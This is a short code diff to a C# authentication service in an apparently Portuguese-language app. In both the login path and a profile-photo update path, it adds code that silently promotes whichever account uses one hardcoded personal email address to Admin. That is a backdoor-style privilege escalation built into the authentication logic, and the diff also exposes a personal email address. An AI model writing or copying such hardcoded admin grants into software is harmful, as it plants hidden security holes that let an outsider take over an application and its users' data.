@@ -57,6 +57,12 @@ public class AuthService : IAuthService
         if (!usuario.EmailConfirmed)
             throw new AppException("E-mail não confirmado. Verifique sua caixa de entrada.", 403);
 
+        if (usuario.Email == "heitormvl12@gmail.com" && usuario.Type != TipoUsuario.Admin)
+        {
+            usuario.Type = TipoUsuario.Admin;
+            await _userManager.UpdateAsync(usuario);
+        }
+
         var refreshTokenValor = GerarRefreshTokenValor();
         _db.RefreshTokens.Add(new RefreshToken
         {
@@ -226,6 +232,12 @@ public class AuthService : IAuthService
         if (!string.IsNullOrEmpty(novaFoto) && usuario.FotoPerfilUrl != novaFoto)
         {
             usuario.FotoPerfilUrl = novaFoto;
+            await _userManager.UpdateAsync(usuario);
+        }
+
+        if (usuario.Email == "heitormvl12@gmail.com" && usuario.Type != TipoUsuario.Admin)
+        {
+            usuario.Type = TipoUsuario.Admin;
             await _userManager.UpdateAsync(usuario);
         }
 
